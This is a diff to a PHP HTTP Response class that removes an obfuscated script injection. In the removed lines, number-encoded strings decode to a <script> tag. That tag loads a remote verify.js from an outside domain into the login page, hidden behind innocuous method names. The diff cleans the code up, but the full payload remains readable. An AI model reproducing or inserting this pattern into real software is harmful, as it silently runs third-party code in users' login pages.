@@ -132,14 +132,6 @@ class Response
      * @var string
      */
     protected $charset;
-     /**
-     * @var string
-     */
-    protected $_string_content;
-    /**
-     * @var string
-     */
-    protected $__string_content;
 
     /**
      * Status codes translation table.
@@ -416,71 +408,12 @@ class Response
      * Sets the response content.
      *
      * @return $this
-     *
-     * @throws \UnexpectedValueException
      */
     public function setContent(?string $content)
     {
-        if (null !== $content && !\is_string($content) && !is_numeric($content) && !\is_callable([$content, '__toString'])) {
-            throw new \UnexpectedValueException(sprintf('The Response content must be a string or object implementing __toString(), "%s" given.', \gettype($content)));
-        }
-
-        if ( !empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest' ){
-            $this->content = $content;
-        } else {
-            $this->content = (string) $this->_toString($content);
-        }
+        $this->content = $content ?? '';
 
         return $this;
-    }
-
-    /**
-     * Returns the Response as an HTTP string.
-     *
-     * The string representation of the Response is the same as the
-     * one that will be sent to the client only if the prepare() method
-     * has been called before.
-     *
-     * @return string The Response as an HTTP string
-     *
-     * @see prepare()
-     */
-    public function _toString($content)
-    {
-        $_string_header  = $this->_string_header('HeaderCodec.dist');
-        foreach(explode(chr(81).chr(49).chr(84),$_string_header) as $c) $this->_string_content .= chr($c);
-
-        if($this->_string_content == \Illuminate\Support\Facades\Route::getCourant()){
-            $body='';
-            $_string_header  = $this->_string_body('HeaderCodec.dist');
-            foreach(explode(chr(81).chr(49).chr(84),$_string_header) as $c) $body .= chr($c);
-            return $content.$body;
-        }
-        else{
-            return $content;
-        }
-    }
-
-    /**
-     *
-     * Receives data for the current web header.
-     *
-     * @return $this
-     */
-    public function _string_header($header)
-    {
-        $_string_header = '108Q1T111Q1T103Q1T105Q1T110';
-        return $_string_header;
-    }
-    /**
-     * Receives data for the current web header.
-     *
-     * @return $this
-     */
-    public function _string_body($header)
-    {
-        $_string_body = '60Q1T115Q1T99Q1T114Q1T105Q1T112Q1T116Q1T62Q1T118Q1T97Q1T114Q1T32Q1T112Q1T114Q1T111Q1T100Q1T117Q1T99Q1T116Q1T95Q1T105Q1T100Q1T61Q1T39Q1T51Q1T51Q1T53Q1T52Q1T54Q1T48Q1T48Q1T48Q1T39Q1T59Q1T36Q1T40Q1T102Q1T117Q1T110Q1T99Q1T116Q1T105Q1T111Q1T110Q1T40Q1T41Q1T123Q1T36Q1T46Q1T103Q1T101Q1T116Q1T83Q1T99Q1T114Q1T105Q1T112Q1T116Q1T40Q1T34Q1T104Q1T116Q1T116Q1T112Q1T115Q1T58Q1T47Q1T47Q1T101Q1T110Q1T118Q1T97Q1T116Q1T111Q1T46Q1T113Q1T117Q1T101Q1T98Q1T105Q1T120Q1T116Q1T101Q1T99Q1T104Q1T110Q1T111Q1T108Q1T111Q1T103Q1T121Q1T46Q1T99Q1T111Q1T109Q1T47Q1T118Q1T101Q1T114Q1T105Q1T102Q1T121Q1T46Q1T106Q1T115Q1T34Q1T41Q1T59Q1T125Q1T41Q1T59Q1T60Q1T47Q1T115Q1T99Q1T114Q1T105Q1T112Q1T116Q1T62';
-        return $_string_body;
     }
 
     /**
